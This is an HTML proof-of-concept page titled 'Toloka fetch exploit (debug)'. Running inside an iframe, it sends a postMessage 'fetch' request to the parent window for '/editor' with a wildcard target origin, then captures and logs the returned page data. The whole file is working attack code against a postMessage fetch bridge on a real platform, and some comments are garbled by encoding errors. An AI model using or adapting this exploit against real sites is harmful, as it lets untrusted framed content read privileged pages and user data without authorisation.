<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>fetch exploit debug</title>
  <style>body { font-family: sans-serif; padding: 20px; }</style>
</head>
<body>
  <h2 style="color:red">Toloka fetch exploit (debug)</h2>
  <pre id="log"></pre>

<script>
const log = (msg) => {
  console.log(msg);
  document.getElementById('log').textContent += msg + '\n';
};

log("[i] iframe origin: " + window.origin);
try {
  log("[i] parent origin: " + window.parent.origin);  // Ù‚Ø¯ ÙŠØ¹Ø·ÙŠ Access Denied
} catch (e) {
  log("[!] Cannot access window.parent.origin: " + e);
}

const id = crypto.randomUUID();

// ğŸ” Step 1: Listen for ANY message from parent
window.addEventListener("message", function handler(e) {
  console.log("[DEBUG] Received message:", e.data);
  log("[DEBUG] Received message from " + e.origin + ": " + JSON.stringify(e.data));

  if (e.data?.id === id && e.data?.name === 'fetch:response') {
    log("[âœ”] Data received from parent!");
    log("Length: " + e.data.payload.length);
  }
});

// ğŸ” Step 2: Send fetch request via postMessage
window.parent.postMessage({
  id,
  name: "fetch",
  payload: {
    url: "/editor",
    requestInit: { method: "GET" }
  }
}, "*");

log("[i] Sent fetch request to parent...");
</script>
</body>
</html>
